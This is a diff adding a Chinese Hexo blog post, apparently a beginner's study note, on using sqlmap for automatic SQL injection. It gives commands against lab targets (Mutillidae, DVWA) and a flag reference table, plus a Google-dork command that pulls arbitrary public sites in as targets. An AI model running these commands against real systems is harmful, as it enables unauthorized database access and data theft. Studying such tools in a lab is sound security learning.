@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="SQLMAP自动注入 ·Get方法     ·sqlmap -u “http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;amp;username=admin&amp;amp;password=password&amp;amp;user-inf">
+  
+
+  
+  
+  
+  
+  
+  
+  <title>sqlmap自动注入 | 且随疾风前行</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SQLMAP自动注入 ·Get方法     ·sqlmap -u “http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;amp;username=admin&amp;amp;password=password&amp;amp;user-info-php-submit-button=View+Account+Details&amp;quot; -p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap自动注入">
+<meta property="og:url" content="http://yoursite.com/2019/03/23/sqlmap自动注入/index.html">
+<meta property="og:site_name" content="且随疾风前行">
+<meta property="og:description" content="SQLMAP自动注入 ·Get方法     ·sqlmap -u “http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;amp;username=admin&amp;amp;password=password&amp;amp;user-info-php-submit-button=View+Account+Details&amp;quot; -p">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-23T05:00:04.392Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlmap自动注入">
+<meta name="twitter:description" content="SQLMAP自动注入 ·Get方法     ·sqlmap -u “http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;amp;username=admin&amp;amp;password=password&amp;amp;user-info-php-submit-button=View+Account+Details&amp;quot; -p">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+</head></html>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="且随疾风前行" rel="home">且随疾风前行</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">烟起云翻，疾风过处尽消散</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-sqlmap自动注入" class="post-sqlmap自动注入 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      sqlmap自动注入
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/23/sqlmap自动注入/" data-id="cjtl0yy2l0002osukgrsu8v5c" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h4><p> ·Get方法<br>     ·sqlmap -u “<a href="http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=password&amp;user-info-php-submit-button=View+Account+Details&quot;" target="_blank" rel="noopener">http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=password&amp;user-info-php-submit-button=View+Account+Details&quot;</a> -p username -f<br> ·扫描URL列表文件<br>      ·<a href="http://1.1.1.1/vuln1.php？q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php？q=foobar</a><br>       <a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*<br>       -d “mysql://user:<a href="mailto:password@192.168.20.10" target="_blank" rel="noopener">password@192.168.20.10</a>:3306/dvwa” -f –users –banner –dbs –schema -a</p>
+<pre><code>·sqlmap -m list.txt
+扫描Google的搜索结果
+SQLmap.py -g &quot;inurl:\&quot;php?id=1\&quot;&quot;
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:left">常用的一些参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">-u</td>
+<td style="text-align:left">指定目标地址</td>
+</tr>
+<tr>
+<td style="text-align:left">-f</td>
+<td style="text-align:left">指纹，足迹</td>
+</tr>
+<tr>
+<td style="text-align:left">-p</td>
+<td style="text-align:left">手动测是要测试的参数</td>
+</tr>
+<tr>
+<td style="text-align:left">-h/-hh</td>
+<td style="text-align:left">展示/详细展示帮助</td>
+</tr>
+<tr>
+<td style="text-align:left">-d</td>
+<td style="text-align:left">把sqlmap作为sql客户端程序直接连接</td>
+</tr>
+<tr>
+<td style="text-align:left">–users</td>
+<td style="text-align:left">所有数据库用户</td>
+</tr>
+<tr>
+<td style="text-align:left">–banner</td>
+<td style="text-align:left">目标是什么版本，什么信息的数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">–dbs</td>
+<td style="text-align:left">所有数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">–schema</td>
+<td style="text-align:left">源数据库(定义数据的数据)</td>
+</tr>
+<tr>
+<td style="text-align:left">-a</td>
+<td style="text-align:left">all</td>
+</tr>
+<tr>
+<td style="text-align:left">–version</td>
+<td style="text-align:left">版本信息</td>
+</tr>
+<tr>
+<td style="text-align:left">-m list.txt</td>
+<td style="text-align:left">扫描多个url</td>
+</tr>
+</tbody>
+</table>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/03/23/sqlmap自动注入/">
+    <time datetime="2019-03-23T04:59:31.000Z" class="entry-date">
+        2019-03-23
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2019/03/19/SQL-注入/" rel="next">SQL-注入 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value name="s" id="s">
+        <input type="submit" id="searchsubmit" value="搜索">
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2019/03/23/sqlmap自动注入/">sqlmap自动注入</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/19/SQL-注入/">SQL-注入</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/19/web安全入门第五天/">web安全入门第五天</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/19/web安全入门第4天/">web安全入门第4天</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/19/web安全入门第三天/">web安全入门第三天</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2019 masterhui
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
